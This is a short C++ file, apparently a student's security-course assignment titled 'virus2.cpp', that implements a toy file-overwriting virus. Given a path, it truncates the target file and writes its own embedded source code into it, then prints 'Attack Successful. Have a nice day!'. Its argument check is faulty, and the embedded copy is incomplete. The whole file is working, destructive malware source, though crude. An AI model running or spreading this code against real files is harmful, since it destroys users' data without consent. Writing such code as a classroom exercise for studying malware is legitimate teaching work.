// COMP3632 Assignment 1 virus2.cpp
// Dhesant Nakka | 20146587

#include <iostream>
#include <fstream>
#include <cstring>

std::string code = "\
// COMP3632 Assignment 1 virus2.cpp\n\r\
// Dhesant Nakka | 20146587\n\r\
\n\r\
#include <iostream>\n\r\
#include <fstream>\n\r\
#include <cstring>\n\r\
\n\r\
std::string code = \"Testing\"\n\r\
\n\r\
int main (int argc, char** argv) {\n\r\
    // Ensure valid argument\n\r\
    if (argc < 1) {\n\r\
	std::cout << \"No target specified\" << std::endl;\n\r\
	return 1;\n\r\
    }\n\r\
    \n\r\
    std::cout << \"Opening: \" << argv[1] << std::endl;\n\r\
    \n\r\
    std::fstream fs;\n\r\
    fs.open(argv[1], std::fstream::out | std::fstream::trunc);\n\r\
    \n\r\
    if (!fs.is_open()) {\n\r\
	std::cout << \"File opening failed\" << std::endl;\n\r\
	return 1;\n\r\
    }\n\r\
    \n\r\
    fs.write(code.c_str(), code.size());\n\r\
    \n\r\
    fs.close();\n\r\
    std::cout << \"Attack Successful. Have a nice day!\" << std::endl;\n\r\
    \n\r\
    return 0;\n\r\
}\n\r\
";

int main (int argc, char** argv) {
    // Ensure valid argument
    if (argc < 1) {
	std::cout << "No target specified" << std::endl;
	return 1;
    }

    
    std::cout << "Opening: " << argv[1] << std::endl;

    std::fstream fs;
    fs.open(argv[1], std::fstream::out | std::fstream::trunc);

    if (!fs.is_open()) {
	std::cout << "File opening failed" << std::endl;
	return 1;
    }
    
    fs.write(code.c_str(), code.size());
    
    fs.close();
    std::cout << "Attack Successful. Have a nice day!" << std::endl;

    return 0;
}
